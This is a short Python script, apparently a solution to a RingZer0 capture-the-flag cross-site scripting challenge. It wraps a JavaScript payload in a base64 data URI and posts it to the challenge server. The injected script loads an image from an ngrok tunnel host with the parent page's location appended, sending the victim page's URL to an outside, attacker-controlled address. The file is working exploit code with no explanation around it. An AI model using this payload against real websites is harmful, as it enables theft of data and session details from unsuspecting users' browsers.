#!/usr/bin/env python3

import base64
import http.client
import urllib.parse

payload = """
<script>
    var img = document.createElement("img");
    img.src = "http://f5fbab8d.ngrok.io/" + parent.document.location;
</script>
"""

params = urllib.parse.urlencode({
    "type": "data:text/html;base64",
    "img": base64.b64encode(payload.encode())
})
headers = {
    "Content-type": "application/x-www-form-urlencoded"
}
conn = http.client.HTTPConnection("challenges.ringzer0team.com:10096")
conn.request("POST", "/xss1/", params, headers)
conn.close()
